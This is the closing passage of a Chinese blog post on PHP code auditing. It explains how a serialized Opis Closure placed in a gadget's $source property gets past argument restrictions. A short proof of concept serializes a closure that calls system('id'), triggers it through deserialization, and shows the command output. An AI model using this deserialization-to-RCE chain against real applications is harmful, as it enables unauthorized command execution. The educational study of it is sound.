</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">buffer</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">write</span>(<span style="color:#58a1dd">$data</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">$length</span> <span style="color:#ff636f">-=</span> <span style="color:#58a1dd">strlen</span>(<span style="color:#58a1dd">$data</span>);
</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">while</span> (<span style="color:#58a1dd">$length</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>看起来很美好，然而有个小问题，我们没法控制$length,只能控制$this-&gt;source，这就导致了我们能使用的函数受限，如何解决这一问题呢，这里就用到了我们之前提到的Closure，在题目中引入了这一类库，那么我们可以让$this-&gt;source为一个函数闭包，一个简化的示意代码如下</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">include</span>(<span style="color:#a6be9d">&#34;closure/autoload.php&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">Test</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$source</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">function</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$cmd</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;id&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">system</span>(<span style="color:#58a1dd">$cmd</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$raw</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">\Opis\Closure\serialize</span>(<span style="color:#58a1dd">$func</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$t</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Test</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$t</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$raw</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$exp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$t</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$o</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$exp</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">call_user_func</span>(<span style="color:#58a1dd">$o</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">source</span>,<span style="color:#a6be9d">9</span>);
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//Output:uid=1000(eki) gid=1000(eki) groups=1000(eki),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
</span></span></span></code></pre></div><p>可以看到通过这个函数闭包，我们绕过了参数限制，实现了完整的RCE。</p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Php安全">Php安全</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/22/" class="post-nav-item" rel="prev" title="Php变量覆盖"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Php变量覆盖</a>
      <a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/26/" class="post-nav-item" rel="next" title="Php 无参数rce">Php 无参数rce<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
